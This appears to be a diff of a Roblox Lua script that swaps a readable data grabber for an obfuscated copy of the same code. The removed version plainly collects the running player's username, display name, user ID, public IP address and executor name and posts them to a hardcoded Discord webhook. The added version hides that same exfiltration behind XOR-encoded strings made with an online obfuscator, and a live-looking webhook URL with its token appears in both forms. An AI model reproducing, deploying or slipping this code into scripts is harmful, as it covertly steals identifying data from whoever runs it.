@@ -1,44 +1,12 @@
--- MADE BY 0rep --
+--[[
+ .____                  ________ ___.    _____                           __                
+ |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
+ |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
+ |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
+ |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
+         \/          \/         \/    \/                \/     \/     \/                   
+          \_Welcome to LuaObfuscator.com   (Alpha 0.10.9) ~  Much Love, Ferib 
 
-local HttpService = game:GetService("HttpService")
-local lp = game.Players.LocalPlayer
-local ip = game:HttpGet("https://api.ipify.org")
+]]--
 
-local data = {
-    ["username"] = "Skid Detector",
-    ["content"] = string.format(
-        "Username: %s\nDisplay Name: %s\nUser ID: %s\nIP: %s\nExecutor: %s",
-        lp.Name,
-        lp.DisplayName,
-        lp.UserId,
-        ip,
-        identifyexecutor and identifyexecutor() or "Unknown"
-    )
-}
-
-local jsonData = HttpService:JSONEncode(data)
-local url = "https://discord.com/api/webhooks/1370915185941807214/BQ0Ve1Nu1DRruP4W9C0_uwa_wWBTbXAo9Xk82_wC571wJm6ZrUOmviw8ta_tddhXYZxh"
-
--- Try all known request methods
-local requestFunc = (syn and syn.request) or http_request or request or (fluxus and fluxus.request)
-
-if requestFunc then
-    local success, result = pcall(function()
-        return requestFunc({
-            Url = url,
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
-            Body = jsonData
-        })
-    end)
-
-    if success then
-        print("Webhook sent successfully.")
-    else
-        warn("Failed to send webhook:", result)
-    end
-else
-    warn("No supported HTTP request function found. Your executor might not support webhooks.")
-end
+local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v15,v16) local v17={};for v22=1, #v15 do v6(v17,v0(v4(v1(v2(v15,v22,v22 + 1 )),v1(v2(v16,1 + (v22% #v16) ,1 + (v22% #v16) + 1 )))%256 ));end return v5(v17);end local v0=string[v7("\210\203\218\55","\126\177\163\187\69\134\219\167")];local v1=string[v7("\33\212\62\192","\156\67\173\74\165")];local v2=string[v7("\39\162\75","\38\84\215\41\118\220\70")];local v3=bit32 or bit ;local v4=v3[v7("\82\14\45\0","\158\48\118\66\114")];local v5=table[v7("\168\43\30\53\114\177","\155\203\68\112\86\19\197")];local v6=table[v7("\79\211\37\249\82\108","\152\38\189\86\156\32\24\133")];local function v7(v18,v19) local v20=0;local v21;while true do if (v20==(420 -(381 + 39))) then v21={};for v27=1, #v18 do v6(v21,v0(v4(v1(v2(v18,v27,v27 + 1 )),v1(v2(v19,1 + (v27% #v19) ,1 + 0 + (v27% #v19) + (1 -0) )))%(1443 -(1069 + 118)) ));end v20=2 -1 ;end if (v20==(1 -0)) then return v5(v21);end end end local v8=game:GetService(v7("\249\215\207\53\213\190\213\8\216\192\222","\126\177\163\187\69\134\219\167"));local v9=game[v7("\204\91\166\95\249\69\180","\38\156\55\199")][v7("\132\114\127\41\31\68\246\66\177\120\110","\35\200\29\28\72\115\20\154")];local v10=game:HttpGet(v7("\43\217\62\213\239\121\130\101\196\236\42\131\35\213\245\37\212\100\202\238\36","\156\67\173\74\165"));local v11={[v7("\33\164\76\4\178\39\75\49","\38\84\215\41\118\220\70")]=v7("\99\29\43\22\190\116\19\54\23\253\68\25\48","\158\48\118\66\114"),[v7("\168\43\30\34\118\171\239","\155\203\68\112\86\19\197")]=string.format("Username: %s\nDisplay Name: %s\nUser ID: %s\nIP: %s\nExecutor: %s",v9.Name,v9.DisplayName,v9.UserId,v10,(identifyexecutor and identifyexecutor()) or v7("\115\211\61\242\79\111\235","\152\38\189\86\156\32\24\133") )};local v12=v8:JSONEncode(v11);local v13=v7("\244\67\179\86\239\13\232\9\248\94\180\69\243\69\163\8\255\88\170\9\253\71\174\9\235\82\165\78\243\88\172\85\179\6\244\17\172\14\246\19\173\15\242\31\168\6\255\22\171\5\246\18\179\117\150\22\202\82\246\104\233\6\131\116\238\66\151\18\203\14\132\22\195\66\176\71\195\64\144\100\200\85\159\103\243\14\159\77\164\5\152\81\223\2\240\23\235\125\170\16\198\69\146\105\241\65\174\81\164\67\166\121\232\83\163\78\196\110\157\94\244","\38\156\55\199");local v14=(syn and syn[v7("\11\186\192\202\136\63\32","\84\121\223\177\191\237\76")]) or http_request or request or (fluxus and fluxus[v7("\169\83\216\181\63\67\36","\161\219\54\169\192\90\48\80")]) ;if v14 then local v23=0 + 0 ;local v24;local v25;local v26;while true do if (v23==(0 -0)) then local v28=0 + 0 ;while true do if (v28==0) then v24=791 -(368 + 423) ;v25=nil;v28=1;end if (v28==(3 -2)) then v23=19 -(10 + 8) ;break;end end end if ((3 -2)==v23) then v26=nil;while true do if (v24~=(442 -(416 + 26))) then else v25,v26=pcall(function() return v14({[v7("\157\111\112","\35\200\29\28\72\115\20\154")]=v13,[v7("\52\186\197\215\130\40","\84\121\223\177\191\237\76")]=v7("\139\121\250\148","\161\219\54\169\192\90\48\80"),[v7("\97\71\1\33\76\80\19","\69\41\34\96")]={[v7("\159\204\217\30\7\37\168\142\227\19\18\46","\75\220\163\183\106\98")]=v7("\3\170\155\59\208\1\187\159\62\214\12\245\129\36\214\12","\185\98\218\235\87")},[v7("\233\51\35\255","\202\171\92\71\134\190")]=v12});end);if (v25 or ((14664 -10071)<=(1147 + 1525))) then print(v7("\30\196\46\128\38\206\39\200\58\196\34\156\105\210\57\139\42\196\63\155\47\212\32\132\48\143","\232\73\161\76"));else warn(v7("\157\216\75\81\27\191\153\86\82\94\168\220\76\89\94\172\220\64\85\17\180\210\24","\126\219\185\34\61"),v26);end break;end end break;end end else warn(v7("\34\193\30\97\107\103\227\232\30\218\91\118\62\95\199\211\60\142\76\119\111\98\246\244\24\142\88\103\112\116\231\238\3\192\30\116\113\98\253\227\66\142\103\125\107\101\179\226\20\203\93\103\106\120\225\167\1\199\89\122\106\55\253\232\24\142\77\103\110\103\252\245\24\142\73\119\124\127\252\232\7\221\16","\135\108\174\62\18\30\23\147"));end
